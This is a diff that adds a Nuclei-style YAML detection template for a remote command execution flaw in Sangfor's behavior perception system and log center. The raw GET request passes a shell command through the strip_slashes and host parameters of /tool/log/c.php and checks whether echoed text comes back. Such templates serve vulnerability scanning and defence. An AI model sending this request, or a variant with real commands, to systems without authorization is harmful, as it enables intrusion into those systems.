@@ -1,0 +1,29 @@
+id: Sangfor Behavior Perception System && Log Center Remote Command Execution Vulnerability
+info:
+  name: Sangfor Behavior Perception System && Log Center Remote Command Execution Vulnerability
+  author: hacktifycs
+  severity: high
+  description: An adversary can perform a Remote Code Execution
+  reference: unknown
+  tags: sangfor, rce
+
+requests:
+  - raw:
+      - |+
+        GET /tool/log/c.php?strip_slashes=system&host=echo%20{{randstr}} HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Language: en-US,en;q=0.9
+        Connection: close
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{randstr}}"
+        part: body
+
+      - type: status
+        status:
+          - 200
